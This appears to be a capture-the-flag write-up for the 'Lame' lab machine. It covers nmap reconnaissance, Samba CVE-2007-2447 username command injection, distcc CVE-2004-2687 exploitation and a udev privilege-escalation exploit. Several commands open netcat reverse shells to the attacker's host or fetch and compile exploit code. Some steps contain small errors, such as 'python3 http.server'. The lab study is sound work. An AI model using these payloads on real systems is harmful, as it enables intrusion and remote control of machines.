## Machine IP Setup

```powershell
export IP=10.10.10.3
```

## Initial Scan

First, we can conduct the initial nmap scan with the following command:

```bash
nmap -sC -sV -O -oA nmap/initial $IP
```

The results we obtain are as follows:

![Lame%203ebd1f539fad4de8915347c6689183d3/Untitled.png](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled.png)

The Ports that are open are:

- port 21: ftp vsftpd 2.3.4  (ftp-anon: Anonymous FTP login allowed (FTP code 230))
- port 22: ssh (ftp-anon: Anonymous FTP login allowed (FTP code 230))
- port 139: netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
- port 445: netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

## Full Scan

Next, let us conduct a full nmap scan with the following command:

```bash
nmap -sC -sV -O -oA nmap/full $IP
```

The results we obtain are as follows:

![Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%201.png](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%201.png)

The additional Ports that are open are:

- port 3632: distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))

## UDP Scan

Lastly, let us conduct a UDP nmap scan on the top 1000 UDP ports with the following command:

```bash
nmap -sU -O -oA nmap/udp $IP
```

The results show no open UDP ports:

## Recon Results

The compiled results we obtain are as follows:

- port 21: ftp vsftpd 2.3.4  (ftp-anon: Anonymous FTP login allowed (FTP code 230))
- port 22: ssh (ftp-anon: Anonymous FTP login allowed (FTP code 230))
- port 139: netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
- port 445: netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
- port 3632: distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))

# Enumeration (Service Version Check)

## port 21: ftp vsftpd 2.3.4

Googling the ftp version gives us a backdoor command execution vulnerability:

![Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%203.png](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%203.png)

To check if there is a nmap script that already checks for the vulnerability, we can execute the following command:

```powershell
ls /usr/share/nmap/scripts/ftp*
```

This will give us:

![Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%204.png](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%204.png)

We can then execute the following command to run the script against port 21:

```powershell
nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.3
```

The result we obtain is as follows:

![Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%205.png](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%205.png)

This shows that we are unable to use this exploit on this machine

## port 139: netbios-ssn Samba smbd 3.X - 4.X // port 445: netbios-ssn Samba smbd 3.0.20-Debian

To use smbclient to enumerate what shares are available on the SMB server:

```powershell
smbclient -L 10.10.10.3
```

![Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%206.png](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%206.png)

This shows the available services on the server

To show the permissions we have on the above displayed drives, we can use the following command:

```powershell
smbmap -H $IP
```

This gives us the following results:

![Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%207.png](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%207.png)

This shows that we have read and write access to the tmp Folder

Googling the version of this smb service, we see that this version has many vulnerabilities associated with it. One of the vulnerabilities we can exploit with this version is: CVE-2007â€“2447

To exploit this vulnerability, we have to send shell metacharacters into the username field, which will as a result allow us to execute arbitrary commands.

The payload will be in the following form:

```python
"/=`nohup " + payload.encoded + "`"
```

## port 3632: distccd distccd v1

Googling this service, we see that theres an exploit for this service: CVE-2004-2687

We can then verify that this service is vulnerable to remote code execution by running the following command:

```powershell
nmap --script distcc-cve2004-2687 -p 3632 $IP
```

This will provide us with the following result:

![Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%208.png](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%208.png)

This result shows that the port is indeed vulnerable to this exploit.

# Initial Foothold

## Approach 1: Samba

To exploit CVE-2007-2447, we have to craft a payload to be deployed into the username field

Firstly, we have to set up a listener on our local machine:

```powershell
nc -nvlp 4444
```

If it runs properly, we will see the following:

![Untitled](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%209.png)

Next, we try to get a reverse shell by running the following command:

```powershell
smb //10.10.10.3/tmp -U "/=`nohup nc -nv 10.10.14.8 4444 -e /bin/sh'"
```

However, we unfortunately get the following result:

![Untitled](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%2010.png)

This likely indicates that there is an issue with running the correct version of netcat as not all versions have the option "-e"

The workaround then is to login anonymously first before we log on via the command "logon":

```powershell
smbclient //10.10.10.3/tmp
```

This will give us the option of logging in anonymously, before we then run the log on command as follows:

```powershell
logon "./=`nohup nc -e /bin/sh 10.10.14.8 4444`"
```

We then press enter without entering any password and we see the following:

![Untitled](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%2011.png)

Checking back on our listening shell, we see the following:

![Untitled](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%2012.png)

To get a good idea of where we are, we can run the following command:

![Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%2013.png](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%2013.png)

### User Flag and Root Flag

With root in hand, we can simply run the following commands to find our two flags:

```powershell
find -name user.txt
find -name root.txt
```

This gives us the following result:

![Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%2014.png](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%2014.png)

And cat-ing the two files, we get both flags:

![Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%2015.png](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%2015.png)

## Approach 2: DistCC

Once again, we have to set up a listener on our local machine

```powershell
nc -nvlp 4444
```

To see that it is listening properly, we will see the following:

![Untitled](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%209.png)

On another shell, we then run the following command:

```python
nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.8 4444 -e /bin/bash'"
```

Upon running, this is the result that we get:

![Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%2016.png](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%2016.png)

On the listener side, we see a connection from our machine:

![Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%2017.png](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%2017.png)

Therefore, we have to do privilege escalation to proceed

### Privilege Escalation

To download the exploit from searchsploit:

```powershell
searchsploit -m 8572.c
```

Next, we set up a simple http server:

```powershell
python3 http.server 9005
```

To download the exploit file from the target machine:

```powershell
wget http://10.10.14.7:9005/8572.c
```

To compile the exploit:

```powershell
gcc 8572.c -o 8572
```

To make use of this exploit, we need the following information:

![Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%2018.png](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%2018.png)

To find the pid of the udevd process, we run the following command:

```powershell
ps -aux | grep devd
```

Next, we create a "run" file containing a reverse shell in /tmp:

```powershell
echo '#!/bin/bash' > run
echo 'nc -nv 10.10.14.7 9005 -e /bin/bash' >> run
```

Next, we set up a listener:

```python
nc -nlvp 4445
```

Lastly, we then run the compiled executable:

```python
./8572 <pid of udevd>
```

# Learning Points (Additional Points)

## SMBClient set up

- Default Kali image has error running smbclient
- To fix, edit the file at /etc/samba/smb.conf:
    
    ![Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%2019.png](Lame%203ebd1f539fad4de8915347c6689183d3/Untitled%2019.png)
    

## Bash interpreting payload first

- When trying to run the payload for samba, where -U "`command`",  the reverse shell is spawned by my shell, not the machine
- This is due to the fact the shell interprets ` ` before the command is even sent, resulting in the error
- Furthermore, using " from the shell seems to make it all CAPs, which also breaks the command injection
